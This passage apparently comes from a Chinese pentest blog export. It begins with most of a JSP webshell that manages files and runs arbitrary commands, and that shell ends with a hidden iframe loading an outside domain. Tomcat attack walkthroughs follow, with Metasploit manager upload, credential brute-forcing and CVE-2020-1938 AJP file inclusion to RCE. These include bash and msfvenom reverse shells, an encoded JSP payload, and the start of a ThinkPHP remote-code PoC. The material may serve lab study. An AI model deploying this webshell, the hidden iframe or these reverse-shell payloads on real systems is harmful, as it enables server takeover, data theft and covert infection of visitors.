else\n {\n  response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");\n  response.setContentType(\"APPLICATION/OCTET-STREAM\"); \n  response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");\n  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());\n  out.clearBuffer();\n  int i;\n  while ((i=fileInputStream.read()) != -1)\n  {\n   out.write(i); \n  }\n  fileInputStream.close();\n  out.close();\n }\n}\n\nif(strAction!=null && strAction.equals(\"del\"))\n{\n File f=new File(strPath);\n f.delete();\n}\n\nif(strAction!=null && strAction.equals(\"edit\"))\n{\n File f=new File(strPath); \n BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));\n sbEdit.append(\"<form name='frmEdit' action='' method='POST'>\\r\\n\");\n sbEdit.append(\"<input type=hidden name=action value=save >\\r\\n\");\n sbEdit.append(\"<input type=hidden name=path value='\"+strDir+\"' >\\r\\n\");\n sbEdit.append(\"<input type=hidden name=file value='\"+strFile+\"' >\\r\\n\");\n sbEdit.append(\"<input type=submit name=save value=' \"+strFileSave[languageNo]+\" '> \");\n sbEdit.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+\" ' onclick='history.back(-1);'> &nbsp;\"+strPath+\"\\r\\n\");\n sbEdit.append(\"<br><textarea rows=30 cols=90 name=content>\");\n String line=\"\";\n while((line=br.readLine())!=null)\n {\n  sbEdit.append(htmlEncode(line)+\"\\r\\n\");  \n }\n   sbEdit.append(\"</textarea>\");\n sbEdit.append(\"<input type=hidden name=path value=\"+strDir+\">\");\n sbEdit.append(\"</form>\");\n}\n\nif(strAction!=null && strAction.equals(\"save\"))\n{\n File f=new File(strPath);\n BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));\n String strContent=request.getParameter(\"content\");\n bw.write(strContent);\n bw.close();\n}\nif(strAction!=null && strAction.equals(\"copy\"))\n{\n File f=new File(strPath);\n sbCopy.append(\"<br><form name='frmCopy' action='' method='POST'>\\r\\n\");\n sbCopy.append(\"<input type=hidden name=action value=savecopy >\\r\\n\");\n sbCopy.append(\"<input type=hidden name=path value='\"+strDir+\"' >\\r\\n\");\n sbCopy.append(\"<input type=hidden name=file value='\"+strFile+\"' >\\r\\n\");\n sbCopy.append(\"原始文件： \"+strPath+\"<p>\");\n sbCopy.append(\"目标文件： <input type=text name=file2 size=40 value='\"+strDir+\"'><p>\");\n sbCopy.append(\"<input type=submit name=save value=' \"+strFileCopy[languageNo]+\" '> \");\n sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+\" ' onclick='history.back(-1);'> <p>&nbsp;\\r\\n\");\n sbCopy.append(\"</form>\");\n}\nif(strAction!=null && strAction.equals(\"savecopy\"))\n{\n File f=new File(strPath);\n String strDesFile=request.getParameter(\"file2\");\n if(strDesFile==null || strDesFile.equals(\"\"))\n {\n  sbSaveCopy.append(\"<p><font color=red>目标文件错误。</font>\");\n }\n else\n {\n  File f_des=new File(strDesFile);\n  if(f_des.isFile())\n  {\n   sbSaveCopy.append(\"<p><font color=red>目标文件已存在,不能复制。</font>\");\n  }\n  else\n  {\n   String strTmpFile=strDesFile;\n   if(f_des.isDirectory())\n   {\n    if(!strDesFile.endsWith(\"\\\\\"))\n    {\n     strDesFile=strDesFile+\"\\\\\";\n    }\n    strTmpFile=strDesFile+\"cqq_\"+strFile;\n    }\n   \n   File f_des_copy=new File(strTmpFile);\n   FileInputStream in1=new FileInputStream(f);\n   FileOutputStream out1=new FileOutputStream(f_des_copy);\n   byte[] buffer=new byte[1024];\n   int c;\n   while((c=in1.read(buffer))!=-1)\n   {\n    out1.write(buffer,0,c);\n   }\n   in1.close();\n   out1.close();\n \n   sbSaveCopy.append(\"原始文件 ：\"+strPath+\"<p>\");\n   sbSaveCopy.append(\"目标文件 ：\"+strTmpFile+\"<p>\");\n   sbSaveCopy.append(\"<font color=red>复制成功！</font>\");   \n  }  \n } \n sbSaveCopy.append(\"<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>\");\n}\nif(strAction!=null && strAction.equals(\"newFile\"))\n{\n String strF=request.getParameter(\"fileName\");\n String strType1=request.getParameter(\"btnNewFile\");\n String strType2=request.getParameter(\"btnNewDir\");\n String strType=\"\";\n if(strType1==null)\n {\n  strType=\"Dir\";\n }\n else if(strType2==null)\n {\n  strType=\"File\";\n }\n if(!strType.equals(\"\") && !(strF==null || strF.equals(\"\")))\n {  \n   File f_new=new File(strF);   \n   if(strType.equals(\"File\") && !f_new.createNewFile())\n    sbNewFile.append(strF+\" 文件创建失败\");\n   if(strType.equals(\"Dir\") && !f_new.mkdirs())\n    sbNewFile.append(strF+\" 目录创建失败\");\n }\n else\n {\n  sbNewFile.append(\"<p><font color=red>建立文件或目录出错。</font>\");\n }\n}\n\nif((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith(\"multipart\")))\n{\n String tempdir=\".\";\n boolean error=false;\n response.setContentType(\"text/html\");\n sbNewFile.append(\"<p><font color=red>建立文件或目录出错。</font>\");\n HttpMultiPartParser parser = new HttpMultiPartParser();\n\n int bstart = request.getContentType().lastIndexOf(\"oundary=\");\n String bound = request.getContentType().substring(bstart + 8);\n int clength = request.getContentLength();\n Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);\n if (ht.get(\"cqqUploadFile\") != null)\n {\n\n  FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");\n  File f1 = fi.file;\n  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);\n  if (info != null && info.aborted) \n  {\n   f1.delete();\n   request.setAttribute(\"error\", \"Upload aborted\");\n  }\n  else \n  {\n   String path = (String) ht.get(\"path\");\n   if(path!=null && !path.endsWith(\"\\\\\")) \n    path = path + \"\\\\\";\n   if (!f1.renameTo(new File(path + f1.getName()))) \n   {\n    request.setAttribute(\"error\", \"Cannot upload file.\");\n    error = true;\n    f1.delete();\n   }\n  }\n }\n}\n%>\n<html>\n<head>\n<style type=\"text/css\">\ntd,select,input,body{font-size:9pt;}\nA { TEXT-DECORATION: none }\n\n#tablist{\npadding: 5px 0;\nmargin-left: 0;\nmargin-bottom: 0;\nmargin-top: 0.1em;\nfont:9pt;\n}\n\n#tablist li{\nlist-style: none;\ndisplay: inline;\nmargin: 0;\n}\n\n#tablist li a{\npadding: 3px 0.5em;\nmargin-left: 3px;\nborder: 1px solid ;\nbackground: F6F6F6;\n}\n\n#tablist li a:link, #tablist li a:visited{\ncolor: navy;\n}\n\n#tablist li a.current{\nbackground: #EAEAFF;\n}\n\n#tabcontentcontainer{\nwidth: 100%;\npadding: 5px;\nborder: 1px solid black;\n}\n\n.tabcontent{\ndisplay:none;\n}\n\n</style>\n\n<script type=\"text/javascript\">\n\nvar initialtab=[<%=tabID%>, \"menu<%=tabID%>\"]\n\n////////Stop editting////////////////\n\nfunction cascadedstyle(el, cssproperty, csspropertyNS){\nif (el.currentStyle)\nreturn el.currentStyle[cssproperty]\nelse if (window.getComputedStyle){\nvar elstyle=window.getComputedStyle(el, \"\")\nreturn elstyle.getPropertyValue(csspropertyNS)\n}\n}\n\nvar previoustab=\"\"\n\nfunction expandcontent(cid, aobject){\nif (document.getElementById){\nhighlighttab(aobject)\nif (previoustab!=\"\")\ndocument.getElementById(previoustab).style.display=\"none\"\ndocument.getElementById(cid).style.display=\"block\"\nprevioustab=cid\nif (aobject.blur)\naobject.blur()\nreturn false\n}\nelse\nreturn true\n}\n\nfunction highlighttab(aobject){\nif (typeof tabobjlinks==\"undefined\")\ncollecttablinks()\nfor (i=0; i<tabobjlinks.length; i++)\ntabobjlinks[i].style.backgroundColor=initTabcolor\nvar themecolor=aobject.getAttribute(\"theme\")? aobject.getAttribute(\"theme\") : initTabpostcolor\naobject.style.backgroundColor=document.getElementById(\"tabcontentcontainer\").style.backgroundColor=themecolor\n}\n\nfunction collecttablinks(){\nvar tabobj=document.getElementById(\"tablist\")\ntabobjlinks=tabobj.getElementsByTagName(\"A\")\n}\n\nfunction do_onload(){\ncollecttablinks()\ninitTabcolor=cascadedstyle(tabobjlinks[1], \"backgroundColor\", \"background-color\")\ninitTabpostcolor=cascadedstyle(tabobjlinks[0], \"backgroundColor\", \"background-color\")\nexpandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])\n}\n\nif (window.addEventListener)\nwindow.addEventListener(\"load\", do_onload, false)\nelse if (window.attachEvent)\nwindow.attachEvent(\"onload\", do_onload)\nelse if (document.getElementById)\nwindow.onload=do_onload\n\n \n\n</script>\n<script language=\"javascript\">\n\nfunction doForm(action,path,file,cmd,tab,content)\n{\n document.frmCqq.action.value=action;\n document.frmCqq.path.value=path;\n document.frmCqq.file.value=file;\n document.frmCqq.cmd.value=cmd;\n document.frmCqq.tabID.value=tab;\n document.frmCqq.content.value=content;\n if(action==\"del\")\n {\n  if(confirm(\"确定要删除文件 \"+file+\" 吗？\"))\n  document.frmCqq.submit();\n }\n else\n {\n  document.frmCqq.submit();    \n }\n}\n</script>\n\n<title>JSP Shell 岁月联盟专用版本</title>\n<head>\n\n\n<body>\n\n<form name=\"frmCqq\" method=\"post\" action=\"\">\n<input type=\"hidden\" name=\"action\" value=\"\">\n<input type=\"hidden\" name=\"path\" value=\"\">\n<input type=\"hidden\" name=\"file\" value=\"\">\n<input type=\"hidden\" name=\"cmd\" value=\"\">\n<input type=\"hidden\" name=\"tabID\" value=\"2\">\n<input type=\"hidden\" name=\"content\" value=\"\">\n</form>\n\n<!--Top Menu Started-->\n<ul id=\"tablist\">\n<li><a href=\"\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[languageNo]%> </a></li>\n<li><a href=\"new.htm\" onClick=\"return expandcontent('menu2', this)\" theme=\"#EAEAFF\"> <%=strCommand[languageNo]%> </a></li>\n<li><a href=\"hot.htm\" onClick=\"return expandcontent('menu3', this)\" theme=\"#EAEAFF\"> <%=strSysProperty[languageNo]%> </a></li>\n<li><a href=\"search.htm\" onClick=\"return expandcontent('menu4', this)\" theme=\"#EAEAFF\"> <%=strHelp[languageNo]%> </a></li>\n &nbsp; <%=authorInfo[languageNo]%>\n</ul>\n<!--Top Menu End-->\n\n\n<%\nStringBuffer sbFolder=new StringBuffer(\"\");\nStringBuffer sbFile=new StringBuffer(\"\");\ntry\n{\n File objFile = new File(strDir);\n File list[] = objFile.listFiles(); \n if(objFile.getAbsolutePath().length()>3)\n {\n  sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePath())+\"','','\"+strCmd+\"','1','');\\\">\");\n  sbFolder.append(strParentFolder[languageNo]+\"</a><br>- - - - - - - - - - - </td></tr>\\r\\n \");\n\n\n }\n for(int i=0;i<list.length;i++)\n {\n  if(list[i].isDirectory())\n  {\n   sbFolder.append(\"<tr><td >&nbsp;</td><td>\");\n   sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');\\\">\");\n   sbFolder.append(list[i].getName()+\"</a><br></td></tr> \");\n  }\n  else\n  {\n      String strLen=\"\";\n   String strDT=\"\";\n   long lFile=0;\n   lFile=list[i].length();\n   strLen = convertFileSize(lFile);\n   Date dt=new Date(list[i].lastModified());\n   strDT=dt.toLocaleString();\n   sbFile.append(\"<tr onmouseover=\\\"this.style.backgroundColor='#FBFFC6'\\\" onmouseout=\\\"this.style.backgroundColor='white'\\\"><td>\");\n   sbFile.append(\"\"+list[i].getName()); \n   sbFile.append(\"</td><td>\");\n   sbFile.append(\"\"+strLen);\n   sbFile.append(\"</td><td>\");\n   sbFile.append(\"\"+strDT);\n   sbFile.append(\"</td><td>\");\n\n   sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','\"+tabID+\"','');\\\">\");\n   sbFile.append(strFileEdit[languageNo]+\"</a> \");\n\n   sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','\"+tabID+\"','');\\\">\");\n   sbFile.append(strFileDel[languageNo]+\"</a> \");\n\n   sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','\"+tabID+\"','');\\\">\");\n   sbFile.append(strFileDown[languageNo]+\"</a> \");\n\n   sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','\"+tabID+\"','');\\\">\");\n   sbFile.append(strFileCopy[languageNo]+\"</a> \");\n  }  \n\n } \n}\ncatch(Exception e)\n{\n out.println(\"<font color=red>操作失败： \"+e.toString()+\"</font>\");\n}\n%>\n\n<DIV id=\"tabcontentcontainer\">\n\n\n<div id=\"menu3\" class=\"tabcontent\">\n<br> \n<br> &nbsp;&nbsp; 未完成\n<br> \n<br>&nbsp;\n\n</div>\n\n<div id=\"menu4\" class=\"tabcontent\">\n<br>\n<p>一、功能说明</p>\n<p>&nbsp;&nbsp;&nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p>\n<p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p>\n<p>与windows的cmd。</p>\n<p>&nbsp;</p>\n<p>二、测试</p>\n<p>&nbsp;&nbsp;&nbsp;<b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>\n留言地址为：<a href=\"http://\" target=\"_blank\"></a></b>\n<p>&nbsp;</p>\n<p>三、更新记录</p>\n<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p>\n<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p>\n<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; 第一个jsp&nbsp;程序就是这个简单的显示目录文件的小程序</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n</div>\n\n\n<div id=\"menu1\" class=\"tabcontent\">\n<%\nout.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>\"+strCurrentFolder[languageNo]+\"： <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");\n%>\n<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercolorlight=\"#000000\" bordercolordark=\"#FFFFFF\">\n       \n        <tr> \n          <td width=\"25%\" align=\"center\" valign=\"top\"> \n              <table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"3\">\n     <%=sbFolder%>\n                </tr>                 \n              </table>\n          </td>\n          <td width=\"81%\" align=\"left\" valign=\"top\">\n \n <%\n if(strAction!=null && strAction.equals(\"edit\"))\n {\n  out.println(sbEdit.toString());\n }\n else if(strAction!=null && strAction.equals(\"copy\"))\n {\n  out.println(sbCopy.toString());\n }\n else if(strAction!=null && strAction.equals(\"down\"))\n {\n  out.println(sbDown.toString());\n }\n else if(strAction!=null && strAction.equals(\"savecopy\"))\n {\n  out.println(sbSaveCopy.toString());\n }\n else if(strAction!=null && strAction.equals(\"newFile\") && !sbNewFile.toString().equals(\"\"))\n {\n  out.println(sbNewFile.toString());\n }\n else\n {\n %>\n  <span id=\"EditBox\"><table width=\"98%\" border=\"1\" cellspacing=\"1\" cellpadding=\"4\" bordercolorlight=\"#cccccc\" bordercolordark=\"#FFFFFF\" bgcolor=\"white\" >\n              <tr bgcolor=\"#E7e7e6\"> \n                <td width=\"26%\"><%=strFileName[languageNo]%></td>\n                <td width=\"19%\"><%=strFileSize[languageNo]%></td>\n                <td width=\"29%\"><%=strLastModified[languageNo]%></td>\n                <td width=\"26%\"><%=strFileOperation[languageNo]%></td>\n              </tr>              \n            <%=sbFile%>\n             <!-- <tr align=\"center\"> \n                <td colspan=\"4\"><br>\n                  总计文件个数：<font color=\"#FF0000\">30</font> ，大小：<font color=\"#FF0000\">664.9</font> \n                  KB </td>\n              </tr>\n    -->\n            </table>\n   </span>\n <%\n }  \n %>\n\n          </td>\n        </tr>\n\n <form name=\"frmMake\" action=\"\" method=\"post\">\n <tr><td colspan=2 bgcolor=#FBFFC6>\n <input type=\"hidden\" name=\"action\" value=\"newFile\">\n <input type=\"hidden\" name=\"path\" value=\"<%=strDir%>\">\n <input type=\"hidden\" name=\"file\" value=\"<%=strFile%>\">\n <input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">\n <input type=\"hidden\" name=\"tabID\" value=\"1\">\n <input type=\"hidden\" name=\"content\" value=\"\">\n <%\n if(!strDir.endsWith(\"\\\\\"))\n strDir = strDir + \"\\\\\";\n %>\n <input type=\"text\" name=\"fileName\" size=36 value=\"<%=strDir%>\">\n <input type=\"submit\" name=\"btnNewFile\" value=\"新建文件\" onclick=\"frmMake.submit()\" > \n <input type=\"submit\" name=\"btnNewDir\" value=\"新建目录\"  onclick=\"frmMake.submit()\" > \n </form>  \n <form name=\"frmUpload\" enctype=\"multipart/form-data\" action=\"\" method=\"post\">\n <input type=\"hidden\" name=\"action\" value=\"upload\">\n <input type=\"hidden\" name=\"path\" value=\"<%=strDir%>\">\n <input type=\"hidden\" name=\"file\" value=\"<%=strFile%>\">\n <input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">\n <input type=\"hidden\" name=\"tabID\" value=\"1\">\n <input type=\"hidden\" name=\"content\" value=\"\">\n <input type=\"file\" name=\"cqqUploadFile\" size=\"36\">\n <input type=\"submit\" name=\"submit\" value=\"上传\">\n </td></tr></form>\n      </table>\n</div>\n<div id=\"menu2\" class=\"tabcontent\">\n\n<%\nString line=\"\";\nStringBuffer sbCmd=new StringBuffer(\"\");\n\nif(strCmd!=null) \n{\n try\n {\n  //out.println(strCmd);\n  Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);\n  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n  while((line=br.readLine())!=null)\n  {\n   sbCmd.append(line+\"\\r\\n\");  \n  }    \n }\n catch(Exception e)\n {\n  System.out.println(e.toString());\n }\n}\nelse\n{\n strCmd = \"set\";\n}\n\n%>\n<form name=\"cmd\" action=\"\" method=\"post\">\n&nbsp;\n<input type=\"text\" name=\"cmd\" value=\"<%=strCmd%>\" size=50>\n<input type=\"hidden\" name=\"tabID\" value=\"2\">\n<input type=submit name=submit value=\"<%=strExecute[languageNo]%>\">\n</form>\n<%\nif(sbCmd!=null && sbCmd.toString().trim().equals(\"\")==false)\n{\n%>\n&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TEXTAREA>\n<br>&nbsp;\n<%\n}\n%>\n</DIV>\n</div>\n<br><br>\n<center><a href=\"http://\" target=\"_blank\"></a> \n<br>\n<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>\n```\n\n\n\n#### MSF攻击\n\n\n\n\n\n```\nuse exploit/multi/http/tomcat_mgr_upload \nset HttpUsername tomcat\nset HttpPassword tomcat\nset rhosts 192.168.175.191\nset rport 8080\nexploit\n```\n\n\n\n这里就直接略过了 自己去操作一下 \n\n这就成功进来了\n\n\n\n![1619340998143](https://gitee.com/work-hard-every-day/test/raw/master/img/1619340998143.png)\n\n\n\n### Tomcat manager App暴力破解\n\n\n\n我们先抓后台的包\n\n\n\n![1619341538485](https://gitee.com/work-hard-every-day/test/raw/master/img/1619341538485.png)\n\n然后放包  进行登录  \n\n\n\n![1619341565301](https://gitee.com/work-hard-every-day/test/raw/master/img/1619341565301.png)\n\n这里注意这段回显\n\n\n\n```\nAuthorization: Basic dG9tY2F0OnRvbWNhdA==\n```\n\n\n\n![1619341609504](https://gitee.com/work-hard-every-day/test/raw/master/img/1619341609504.png)\n\n\n\n发现Tomcat的后台登录账号和密码\n\n\n\n是以base64加密的 账号:密码\n\n\n\n然后我们重新去抓后台的包 进行爆破\n\n\n\n![1619341768817](https://gitee.com/work-hard-every-day/test/raw/master/img/1619341768817.png)\n\n![1619341811564](https://gitee.com/work-hard-every-day/test/raw/master/img/1619341811564.png)\n\n\n\n添加密码本 和base64 的编码规则 \n\n\n\n把这个自带的编码 对勾去掉\n\n\n\n![1619342044653](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342044653.png)\n\n\n\n开始攻击 拿到账号和密码\n\n\n\n![1619342139990](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342139990.png)\n\n\n\n这里讲第二种方式\n\n\n\n自定义迭代器\n\n\n\n![1619342352290](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342352290.png)\n\n\n\n分位置 进行不同的载入\n\n\n\n比如这里 就应该是3个位置\n\n![1619342430579](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342430579.png)\n\n\n\n\n\n![1619342458443](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342458443.png)\n\n\n\n\n\n![1619342481874](https://gitee.com/work-hard-every-day/test/raw/master/img/1619342481874.png)\n\n\n\n下面和之前的设置 一样 \n\n\n\nbase64编码 和去掉对勾 默认的Url编码\n\n\n\n\n\n### Tomcat AJP文件包含漏洞分析(CVE-2020-1938）\n\n#### 影响版本：\n\n```\nApache Tomcat 9.x < 9.0.31\nApache Tomcat 8.x<8.5.51\nApache Tomcat 7.x<7.0.100\nApache tomcat 6.x\n```\n\n\n\n\n\n### 复现\n\n利用vulhub\n\n```\ncd tomcat/CVE-2020-1938\n\nsudo docker-compose up -d\n```\n\n\n\n![1619348867355](https://gitee.com/work-hard-every-day/test/raw/master/img/1619348867355.png)\n\n\n\nPoc地址：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \n\n\n\n脚本是基于Python2的\n\n\n\n它可以看webapps目录下的所有东西\n\n\n\n![1619349787403](https://gitee.com/work-hard-every-day/test/raw/master/img/1619349787403.png)\n\n\n\n可以看到它的语法要求\n\n\n\n```\npython2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件\n```\n\n\n\n\n\n```\npython2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml\n```\n\n\n\n![1619349894166](https://gitee.com/work-hard-every-day/test/raw/master/img/1619349894166.png)\n\n\n\n文件包含RCE \n\n在线bash payload生成： http://www.jackson-t.ca/runtime-exec-payloads.html \n\n\n\n```\nbash -i >& /dev/tcp/192.168.175.191/8888 0>&1\n```\n\n![1619350245468](https://gitee.com/work-hard-every-day/test/raw/master/img/1619350245468.png)\n\n\n\n```\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n最终的txt的payload\n\n\n\n```\n<%\n    java.io.InputStream in = Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\").getInputStream();\n    int a = -1;\n    byte[] b = new byte[2048];\n    out.print(\"<pre>\");\n    while((a=in.read(b))!=-1){\n        out.println(new String(b));\n    }\n    out.print(\"</pre>\");\n%>\n```\n\n\n\n这边要手动上传上去 \n\n\n\n查看\n\n\n\n```\nsudo docker ps\n```\n\n![1619350478774](https://gitee.com/work-hard-every-day/test/raw/master/img/1619350478774.png)\n\n\n\n然后开始上传\n\n\n\n```\nsudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT\n```\n\n\n\n可以去docker 底层看看\n\n\n\n```\nsudo docker exec -ti 6c bash\n```\n\n\n\n\n\n![](https://gitee.com/work-hard-every-day/test/raw/master/img/1619350649495.png)\n\n\n\n成功传上去了\n\n\n\n开启nc监听 \n\n\n\n具体可以看这里：https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&spm=1000.2123.3001.4430\n\n\n\n![1619351018857](https://gitee.com/work-hard-every-day/test/raw/master/img/1619351018857.png)\n\n\n\n```\npython2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt\n```\n\n\n\n\n\n![1619351185840](https://gitee.com/work-hard-every-day/test/raw/master/img/1619351185840.png)\n\n\n\n\n\n![1619351175429](https://gitee.com/work-hard-every-day/test/raw/master/img/1619351175429.png)\n\n\n\n\n\n可以看到成功上线了\n\n\n\n**可以和War联动是吧 可以和PUT联动是吧**\n\n### 把shell弹到MSF上\n\n\n\nMSF生成木马\n\n\n\n我这边还是上kali吧  Ubuntu不是很顺手\n\n\n\n```\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R > shell.txt\n```\n\n\n\n![1619351850151](https://gitee.com/work-hard-every-day/test/raw/master/img/1619351850151.png)\n\n\n\n```\nsudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT\n```\n\n\n\n去docker底层看看\n\n\n\n![1619351998810](https://gitee.com/work-hard-every-day/test/raw/master/img/1619351998810.png)\n\n\n\n上MSF 开启监听\n\n\n\n```\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp\npayload => java/jsp_shell_reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 192.168.175.167\nlhost => 192.168.175.167\nmsf6 exploit(multi/handler) > set lport 4444\nlport => 4444\nmsf6 exploit(multi/handler) > exploit -j\n```\n\n\n\n执行文件包含RCE\n\n```\npython2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt\n```\n\n\n\n\n\n![1619352574611](https://gitee.com/work-hard-every-day/test/raw/master/img/1619352574611.png)\n\n\n\n可以看到已经拿到shell了\n\n\n\n![1619352504843](https://gitee.com/work-hard-every-day/test/raw/master/img/1619352504843.png)\n\n\n\n按shell就可以进来了\n\n\n\n![1619352730021](https://gitee.com/work-hard-every-day/test/raw/master/img/1619352730021.png)","tags":["Tomcat总结"],"categories":["服务攻防"]},{"title":"Thinkphp总结","url":"/2021/06/22/Thinkphp/","content":"\n**Thinkphp**\n\n<!--more-->\n\n## \t本地安装\n\n官网：http://www.thinkphp.cn/down.html\n\n经典的版本就是这四大类\n\n\n\n![image-20210516101707716](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516101707716.png)\n\n\n\n\n\n安装vc9_x86(必装)\n\n\n\n![image-20210516102503058](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516102503058.png)\n\n\n\n安装phpstudy-2016\n\n\n\n![image-20210516102546033](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516102546033.png)\n\n\n\n把Thinkphp的包搞到WWW目录下\n\n\n\n![image-20210516102800809](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516102800809.png)\n\n\n\n这里要注意一下\n\n\n\n默认的Thinkphp框架下是有`robots.txt`的\n\n\n\n![image-20210516102909994](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516102909994.png)\n\n\n\n存在信息泄露的\n\n\n\n写入的shell或者一句话 也是在这个目录下\n\n```\nC:\\phpStudy\\WWW\\a001\\public\n```\n\n\n\n然后存放日志的目录 是这个\n\n```\nC:\\phpStudy\\WWW\\a001\\thinkphp\\library\\think\\log\n```\n\n\n\n![image-20210516103104540](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516103104540.png)\n\n\n\n要对外访问的嘛  所以要配置域名\n\n\n\n这里要注意 目录要选到public目录下 这样才能识别到这个目录下的`router.php`\n\n\n\n![image-20210516103602494](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516103602494.png)\n\n\n\n![image-20210516104047481](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516104047481.png)\n\n\n\n\n\n\n\n\n\n![image-20210516103643043](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516103643043.png)\n\n\n\n这里也可以不用IP \n\n\n\n如果你没有用IP的话 就要去改一下hosts文件\n\n\n\n然后新增 保存一下\n\n\n\n\n\n![image-20210516103759492](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516103759492.png)\n\n\n\n然后远程访问一下 \n\n\n\n![image-20210516103844729](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516103844729.png)\n\n\n\n## 本地漏洞复现\n\n### Poc1-phpinfo\n\n```\n/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo\n```\n\n\n\n![image-20210516104439807](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210516104439807.png)\n\n\n\n### Poc2-写入一句话\n\n\n\n```\n<?php 